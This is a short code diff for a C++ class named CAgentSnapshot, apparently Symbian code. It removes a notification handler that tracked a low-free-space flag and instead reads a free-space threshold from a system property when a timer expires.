@@ -76,28 +76,6 @@ void CAgentSnapshot::StopAgentCmdL()
 	iTimer->Cancel();
 	}
 
-void CAgentSnapshot::NotifyAgentCmdL(TUint32 aData)
-	{
-	TInt notifyType = aData & 0x000000ff;
-	switch(notifyType)
-		{
-		case ENotifyThreshold:
-			{
-			TInt value = (aData & 0x0000ff00) >> 8;
-			if (value == EBelow)
-				{
-				iBelowFreespaceQuota = ETrue;
-				}
-			else
-				{
-				iBelowFreespaceQuota = EFalse;
-				}
-			}
-			break;
-		default:
-			break;
-		}
-	}
 
 
 void CAgentSnapshot::TimerExpiredL(TAny* src)
@@ -113,7 +91,9 @@ void CAgentSnapshot::TimerExpiredL(TAny* src)
 	buf.CleanupClosePushL();
 	if (buf.Length() > 0)
 		{
-		if(!iBelowFreespaceQuota)
+		TInt value;
+		RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+		if(value)
 			{
 			//__FLOG_HEXDUMP(buf.Ptr(), buf.Length());
 			TSnapshotAdditionalData additionalData;
